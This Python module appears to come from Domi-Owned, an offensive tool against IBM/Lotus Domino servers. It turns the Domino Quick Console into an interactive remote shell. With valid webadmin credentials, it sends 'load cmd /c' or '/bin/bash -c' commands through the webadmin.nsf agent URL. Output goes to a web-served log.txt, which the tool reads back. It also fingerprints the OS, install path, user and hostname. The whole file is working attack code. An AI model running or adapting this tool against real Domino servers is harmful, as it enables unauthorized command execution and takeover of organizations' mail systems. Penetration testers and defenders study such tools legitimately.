# Copyright (c) 2017, Brandan Geise [coldfusion]
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
import cmd
import hashlib
import re
import requests
import sys

from .main import DomiOwned
from .utilities import Utilities


class QuickConsole(DomiOwned):

	def quickconsole(self):
		"""
		Interact with Domino Quick Console through web requests.
		"""
		# Check if the user can access webadmin.nsf
		if self.check_access(self.username, self.password)['webadmin.nsf']:

			if self.auth_type == 'basic':
				self.session.auth = (self.username, self.password)

			# Get information about Quick Console instance
			info = self.get_info()
			if None not in info.values():
				self.logger.info("Running as {0}".format(info['user']))

				# Start interacting with the Domino Quick Console
				Interact(self.logger, self.session, self.url, info).cmdloop()
			else:
				self.logger.warn('Domino Quick Console is not active')
		else:
			self.logger.error("Unable to access {0}/webadmin.nsf, bad username or password".format(self.url))

	def get_info(self):
		"""
		Get OS, install path, hostname, and account the Domino server is running as.
		"""
		info = {
			'url': self.url,
			'os': None,
			'path': None,
			'user': None,
			'hostname': None
		}

		try:
			response = self.session.get("{0}/webadmin.nsf/fmpgHomepage?ReadForm".format(self.url))
		except (requests.exceptions.RequestException, requests.exceptions.ReadTimeoutError) as error:
			self.logger.error('Request timeout, the Domino server has stopped responding')
			sys.exit()

		# Linux Domino server
		if 'UNIX' in response.text:
			info['os'] = 'linux'
			user_regex = self.utilities.LINUX_USER_REGEX
			user_command = 'echo $HOSTNAME:$USER'
			command_template = "load /bin/bash -c \"{command} > {path}/domino/html/download/filesets/log.txt\""

			domino_paths = [
				'/local/notesdata'                                       # 9.0.1 Ubuntu x32
			]

		# Windows Domino server
		else:
			info['os'] = 'windows'
			user_regex = self.utilities.WINDOWS_USER_REGEX
			user_command = 'whoami'
			command_template = "load cmd /c {command} > \"{path}\\domino\\html\\download\\filesets\\log.txt\""

			domino_paths = [
				'C:\\Program Files\\IBM\\Domino\\data',                  # 9.0.1 Windows x64
				'C:\\Program Files\\IBM\\Lotus\\Domino\\data',           # 8.5.3 Windows x64
				'C:\\Program Files (x86)\\IBM\\Domino\\data',            # 9.0.1 Windows x86
				'C:\\Program Files (x86)\\IBM\\Lotus\\Domino\\data',     # 8.5.3 Windows x86
				'C:\\Lotus\\Domino\\data'                                # Unknown
			]

		# Get local file path
		if self.utilities.PATH_REGEX.search(response.text):
			path = self.utilities.PATH_REGEX.search(response.text).group(1)
			if path.replace('\\\\', '\\') not in domino_paths:
				domino_paths.insert(0, path.replace('\\\\', '\\'))

		# Get Domino install path
		for domino_path in domino_paths:
			path_id = hashlib.md5(domino_path.encode('utf-8')).hexdigest()
			command = command_template.format(command="echo {0}".format(path_id), path=domino_path)
			response = self.send_command(command)
			if path_id in response.text:
				info['path'] = domino_path
				break

		# Get user and hostname
		command = command_template.format(command=user_command, path=domino_path)
		response = self.send_command(command)
		if user_regex.search(response.text):
			info['hostname'], info['user'] = user_regex.search(response.text.rstrip()).group(1, 2)

		return info

	def send_command(self, command):
		"""
		Send a command to the Domino Quick Console.
		"""
		try:
			response = self.session.get("{0}/webadmin.nsf/agReadConsoleData$UserL2?OpenAgent&Mode=QuickConsole&Command={1}&1446773019134".format(self.url, command))
			if 'Command has been executed' in response.text:
				return self.session.get("{0}/download/filesets/log.txt".format(self.url))
			else:
				self.logger.error('Failed to execute command using the Quick Console')
				sys.exit()

		except (requests.exceptions.RequestException, requests.exceptions.ReadTimeoutError) as error:
			self.logger.error('Request timeout, the Domino server has stopped responding')
			sys.exit()


class Interact(cmd.Cmd):
	"""
	Drop into interactive Quick Console session.
	"""
	def __init__(self, logger, session, url, info):
		cmd.Cmd.__init__(self)
		self.utilities = Utilities()
		self.logger = logger
		self.session = session
		self.url = url

		if info['os'] == 'windows':
			self.del_command = 'del'
			self.prompt = "{0}:\\Windows\\System32>".format(info['path'].split(':')[0])
			self.command_template = "load cmd /c {command} {operator}\"" + "{0}\\domino\\html\\download\\filesets\\log.txt\"".format(info['path'])
		else:
			self.del_command = 'rm'
			self.prompt = "{0}@{1}:/local/notesdata$ ".format(info['user'], info['hostname'])
			self.command_template = "load /bin/bash -c \"{command} {operator}" + "{0}/domino/html/download/filesets/log.txt\"".format(info['path'])

	def emptyline(self):
		pass

	def default(self, line):
		self.console(line)

	def console(self, command, operator='> '):
		response = self.send(self.command_template.format(command=command, operator=operator))
		if response is None:
			self.logger.error('Command is too long')
		elif response is False:
			self.logger.error('Failed to execute command using the Quick Console')
		elif response.status_code == 200 and '>' in operator:
			print(response.text)
		elif response.status_code == 200 and '>' not in operator:
			self.logger.error('Unable to delete outfile')
		elif response.status_code == 404 and '>' not in operator:
			self.logger.info('Outfile successfully deleted')
		else:
			self.logger.error('Outfile not found')
			self.do_exit

	def send(self, command):
		"""
		Send a command to the Domino Quick Console.
		"""
		# Quick Console commands must be less than 255 characters
		if len(command) > 255:
			return None
		else:
			try:
				response = self.session.get("{0}/webadmin.nsf/agReadConsoleData$UserL2?OpenAgent&Mode=QuickConsole&Command={1}&1446773019134".format(self.url, command))
				if 'Command has been executed' in response.text:
					return self.session.get("{0}/download/filesets/log.txt".format(self.url))
				else:
					return False

			except (requests.exceptions.RequestException, requests.exceptions.ReadTimeoutError) as error:
				self.logger.error('Request timeout, the Domino server has stopped responding')
				self.do_exit

	def do_EOF(self, line):
		operator = ''
		self.console(self.del_command, operator=operator)

		return True

	def help_EOF(self):
		self.logger.debug('Type exit to quit')

	do_exit = do_EOF
	help_exit = help_EOF
